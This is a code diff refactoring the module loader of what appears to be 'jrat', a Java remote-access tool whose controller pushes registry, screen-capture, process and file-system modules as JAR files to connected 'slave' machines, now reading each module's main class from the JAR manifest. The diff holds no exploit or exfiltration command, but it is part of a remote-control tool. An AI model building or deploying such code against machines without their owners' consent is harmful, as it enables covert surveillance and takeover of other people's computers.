@@ -14,8 +14,10 @@ import java.net.URLClassLoader;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
+import java.util.jar.Attributes;
 import java.util.jar.JarEntry;
 import java.util.jar.JarInputStream;
+import java.util.jar.Manifest;
 
 public class ModuleLoader {
 
@@ -26,14 +28,10 @@ public class ModuleLoader {
 
         public String pathPrefix;
         public String controllerMain;
-        public String clientMain;
-        public long seed;
 
-        public ModuleData(String pathPrefix, String controllerMain, String clientMain) {
+        public ModuleData(String pathPrefix, String controllerMain) {
             this.pathPrefix = pathPrefix;
             this.controllerMain = controllerMain;
-            this.clientMain = clientMain;
-            this.seed = new Random().nextLong();
         }
 
         public File getControllerFile() {
@@ -48,17 +46,16 @@ public class ModuleLoader {
     private static final List<ModuleData> modules = new ArrayList<ModuleData>();
 
     static {
-        modules.add(new ModuleData( "registry", "jrat.module.registry.RegistryControllerModule", "jrat.module.registry.RegistryClientModule"));
-        modules.add(new ModuleData("screen", "jrat.module.screen.ScreenControllerModule", "jrat.module.screen.ScreenClientModule"));
-        modules.add(new ModuleData("process", "jrat.module.process.ProcessControllerModule", "jrat.module.process.ProcessClientModule"));
-        modules.add(new ModuleData("fs", "jrat.module.fs.FileSystemControllerModule", "jrat.module.fs.FileSystemClientModule"));
+        modules.add(new ModuleData("registry", "jrat.module.registry.RegistryControllerModule"));
+        modules.add(new ModuleData("screen", "jrat.module.screen.ScreenControllerModule"));
+        modules.add(new ModuleData("process", "jrat.module.process.ProcessControllerModule"));
+        modules.add(new ModuleData("fs", "jrat.module.fs.FileSystemControllerModule"));
     }
 
     /**
      * Load all server side modules
-     * @throws Exception
      */
-    public static void load() throws Exception {
+    public static void load() {
         Logger.log("Loading " + modules.size() + " modules...");
 
         for (ModuleData mod : modules) {
@@ -92,11 +89,15 @@ public class ModuleLoader {
         slave.writeInt(modules.size());
 
         for (ModuleData mod : modules) {
-            slave.writeLine(mod.clientMain);
-
             int total = 0;
 
             JarInputStream jis = new JarInputStream(new FileInputStream(mod.getClientFile()));
+
+            Manifest mf = jis.getManifest();
+            String mainClass = mf.getMainAttributes().getValue("Main-Class");
+
+            slave.writeLine(mainClass);
+
             JarEntry entry;
             while ((entry = jis.getNextJarEntry()) != null) {
                 int size = (int) entry.getSize();
@@ -130,7 +131,7 @@ public class ModuleLoader {
 
             // indicate that there are no entries left for this module
             slave.writeBoolean(false);
-            Logger.log("wrote module '" + mod.clientMain + "' (" + total + " b)");
+            Logger.log("wrote module '" + mainClass + "' (" + total + " b)");
         }
     }
 }
